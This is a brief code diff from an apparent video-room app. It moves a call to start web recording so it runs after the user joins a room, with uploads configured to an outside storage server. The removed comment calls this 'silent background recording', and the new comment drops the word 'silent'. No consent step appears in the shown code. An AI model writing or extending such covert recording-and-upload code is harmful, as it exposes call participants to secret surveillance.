@@ -64,9 +64,10 @@ class _RoomPageState extends State<RoomPage> {
       // Configure server endpoint for recording uploads
       _session.recordUploadUrl = Uri.parse('https://storage.qaxp.com/upload');
       await _session.loadDevices();
-      // Start silent background recording immediately on room creation (web only)
-      await _session.startRecordingWeb();
+      // Join first so local media is acquired before starting the recorder
       await _session.join(widget.roomName, client: widget.signalingClient);
+      // Start background recording after local tracks exist
+      await _session.startRecordingWeb();
       _scheduleHide();
       setState(() {});
     });
